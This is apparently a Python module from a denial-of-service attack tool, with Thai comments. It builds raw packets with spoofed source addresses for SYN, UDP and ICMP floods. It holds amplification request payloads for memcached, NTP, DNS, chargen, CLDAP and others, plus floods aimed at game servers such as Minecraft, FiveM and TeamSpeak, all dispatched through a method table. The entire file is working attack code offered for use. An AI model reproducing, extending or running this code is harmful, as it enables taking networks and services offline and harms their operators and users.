# attacker/l4.py — L3/L4 flood + amplification (raw sockets, root required)
# ใช้ icmplib fallback สำหรับ ICMP ตอนรันแบบ non-root
import socket, struct, random, time, threading, os, asyncio
from config import MAX_TIME

try:
    from icmplib import ping
    _HAS_ICMPLIB = True
except ImportError:
    _HAS_ICMPLIB = False

def _is_root():
    try:
        return os.geteuid() == 0
    except AttributeError:
        return False

def _rand_ip():
    return f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

def _checksum(data):
    if len(data) % 2: data += b"\x00"
    s = 0
    for i in range(0, len(data), 2):
        s += (data[i] << 8) + data[i+1]
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return ~s & 0xFFFF

def _ip_hdr(src, dst, proto, plen):
    ver_ihl = 0x45; tos = 0
    total = 20 + plen
    ip_id = random.randint(0, 65535)
    frag = 0
    ttl = random.randint(60, 255)
    hdr = struct.pack("!BBHHHBBH4s4s", ver_ihl, tos, total, ip_id, frag, ttl, proto, 0,
                      socket.inet_aton(src), socket.inet_aton(dst))
    chk = _checksum(hdr)
    return struct.pack("!BBHHHBBH4s4s", ver_ihl, tos, total, ip_id, frag, ttl, proto, chk,
                       socket.inet_aton(src), socket.inet_aton(dst))

def _syn(src, dst, dport):
    sport = random.randint(1024, 65535)
    seq = random.randint(0, 0xFFFFFFFF)
    off = 5 << 4
    flags = 0x02
    win = 65535
    hdr0 = struct.pack("!HHIIBBHHH", sport, dport, seq, 0, off, flags, win, 0, 0)
    pseudo = struct.pack("!4s4sBBH", socket.inet_aton(src), socket.inet_aton(dst), 0, socket.IPPROTO_TCP, len(hdr0))
    chk = _checksum(pseudo + hdr0)
    tcp = struct.pack("!HHIIBBHHH", sport, dport, seq, 0, off, flags, win, chk, 0)
    return _ip_hdr(src, dst, socket.IPPROTO_TCP, len(tcp)) + tcp

def _udp(src, dst, dport, payload=None):
    sport = random.randint(1024, 65535)
    payload = payload if payload is not None else os.urandom(random.randint(64, 1400))
    length = 8 + len(payload)
    hdr0 = struct.pack("!HHHH", sport, dport, length, 0)
    pseudo = struct.pack("!4s4sBBH", socket.inet_aton(src), socket.inet_aton(dst), 0, socket.IPPROTO_UDP, length)
    chk = _checksum(pseudo + hdr0 + payload) or 0xFFFF
    hdr = struct.pack("!HHHH", sport, dport, length, chk)
    return _ip_hdr(src, dst, socket.IPPROTO_UDP, length) + hdr + payload

def _icmp(src, dst):
    ident = random.randint(0, 65535); seq = random.randint(0, 65535)
    payload = b"A" * 32
    hdr0 = struct.pack("!BBHHH", 8, 0, 0, ident, seq)
    chk = _checksum(hdr0 + payload)
    pkt = struct.pack("!BBHHH", 8, 0, chk, ident, seq) + payload
    return _ip_hdr(src, dst, socket.IPPROTO_ICMP, len(pkt)) + pkt

def _raw():
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
    return s

def _flood_raw(target, port, until, builder):
    try:
        s = _raw()
    except PermissionError:
        raise RuntimeError("raw socket requires root — run api as root")
    while time.time() < until:
        try:
            pkt = builder(_rand_ip(), target, port)
            s.sendto(pkt, (target, 0))
        except OSError:
            pass
    s.close()

def _flood_udp_plain(target, port, until, payload=None):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
    body = payload or os.urandom(1400)
    while time.time() < until:
        try:
            s.sendto(body, (target, port))
        except OSError:
            pass
    s.close()

def _flood_tcp_conn(target, port, until):
    while time.time() < until:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((target, port))
            s.send(b"\x00" * 128)
            s.close()
        except Exception:
            pass

# ---- ICMP dual-mode: raw ถ้า root / icmplib ถ้าไม่ ----

def _icmp_root(target, port, until):
    _flood_raw(target, port, until, lambda s, d, p: _icmp(s, d))

def _icmp_noroot(target, port, until):
    if not _HAS_ICMPLIB:
        raise RuntimeError("icmplib not installed and not running as root")
    while time.time() < until:
        try:
            ping(target, count=1, interval=0.0, timeout=0.2, privileged=False)
        except Exception:
            pass

def _icmp_auto(target, port, until):
    if _is_root():
        return _icmp_root(target, port, until)
    return _icmp_noroot(target, port, until)

# ---- amplification payloads ----

def _memcached(target, port, until):
    payloads = [b"stats\r\n", b"stats items\r\n", b"stats slabs\r\n"]
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while time.time() < until:
        try:
            s.sendto(random.choice(payloads), (target, port))
        except OSError:
            pass

def _ntp(target, port, until):
    pkt = b"\x17\x00\x03\x2a" + b"\x00" * 44
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while time.time() < until:
        try:
            s.sendto(pkt, (target, port))
        except OSError:
            pass

def _dns(target, port, until):
    def q(domain):
        tid = random.randint(0, 65535)
        flags = 0x0100
        hdr = struct.pack("!HHHHHH", tid, flags, 1, 0, 0, 1)
        qname = b"".join(bytes([len(p)]) + p.encode() for p in domain.split(".")) + b"\x00"
        qst = qname + struct.pack("!HH", 255, 1)
        opt = b"\x00" + struct.pack("!HHIH", 41, 4096, 0, 0)
        return hdr + qst + opt
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while time.time() < until:
        try:
            s.sendto(q(target), (target, port))
        except OSError:
            pass

def _chargen(target, port, until):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while time.time() < until:
        try:
            s.sendto(b"\x00", (target, port))
        except OSError:
            pass

def _cldap(target, port, until):
    pkt = bytes.fromhex("300c020101600702010304008000")
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while time.time() < until:
        try:
            s.sendto(pkt, (target, port))
        except OSError:
            pass

def _ard(target, port, until):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    pkt = b"\x00" * 36
    while time.time() < until:
        try:
            s.sendto(pkt, (target, port))
        except OSError:
            pass

def _rdp(target, port, until):
    pkt = bytes.fromhex("030000132ee00000000000010008000b000000")
    while time.time() < until:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((target, port))
            s.send(pkt)
            s.close()
        except Exception:
            pass

# ---- game protocols ----

def _vse(target, port, until):
    pkt = b"\xFF\xFF\xFF\xFFTSource Engine Query\x00"
    _flood_udp_plain(target, port, until, pkt)

def _ts3(target, port, until):
    pkt = b"\x00\x00\x00\x00\x00\x00\x00\x00"
    _flood_udp_plain(target, port, until, pkt)

def _minecraft(target, port, until):
    while time.time() < until:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((target, port))
            host = target.encode()
            hs = b"\x00" + b"\x00" + b"\x00" + struct.pack(">b", len(host)) + host + struct.pack(">H", port) + b"\x01"
            s.send(bytes([len(hs)]) + hs)
            s.send(b"\x01\x00")
            s.close()
        except Exception:
            pass

def _mcbot(target, port, until):
    _minecraft(target, port, until)

def _mcpe(target, port, until):
    ts = int(time.time())
    guid = random.randint(0, 0xFFFFFFFFFFFFFFFF)
    pkt = b"\x01" + struct.pack(">Q", ts) + b"\x00" * 8 + struct.pack(">Q", guid)
    _flood_udp_plain(target, port, until, pkt)

def _fivem(target, port, until):
    pkt = b"\xFF\xFF\xFF\xFFgetinfo xxx"
    _flood_udp_plain(target, port, until, pkt)

def _fivem_token(target, port, until):
    pkt = b"\xFF\xFF\xFF\xFFgetinfo token"
    _flood_udp_plain(target, port, until, pkt)

def _ovh_udp(target, port, until):
    _flood_udp_plain(target, port, until, os.urandom(random.randint(200, 800)))

def _cps(target, port, until):
    _flood_tcp_conn(target, port, until)

def _connection(target, port, until):
    _flood_tcp_conn(target, port, until)

def _tcp(target, port, until):
    _flood_raw(target, port, until, lambda s, d, p: _udp(s, d, p))

METHODS = {
    "SYN":        lambda t,p,u: _flood_raw(t, p, u, _syn),
    "UDP":        lambda t,p,u: _flood_udp_plain(t, p, u),
    "TCP":        lambda t,p,u: _flood_tcp_conn(t, p, u),
    "ICMP":       _icmp_auto,
    "OVH-UDP":    _ovh_udp,
    "CPS":        _cps,
    "CONNECTION": _connection,
    "VSE":        _vse,
    "TS3":        _ts3,
    "FIVEM":      _fivem,
    "FIVEM-TOKEN":_fivem_token,
    "MEM":        _memcached,
    "NTP":        _ntp,
    "DNS":        _dns,
    "CHAR":       _chargen,
    "CLDAP":      _cldap,
    "ARD":        _ard,
    "RDP":        _rdp,
    "MINECRAFT":  _minecraft,
    "MCBOT":      _mcbot,
    "MCPE":       _mcpe,
}

async def run(method, target, port, until):
    fn = METHODS.get(method.upper())
    if not fn:
        raise ValueError(f"unknown L4 method: {method}")
    await asyncio.get_event_loop().run_in_executor(None, lambda: fn(target, port, until))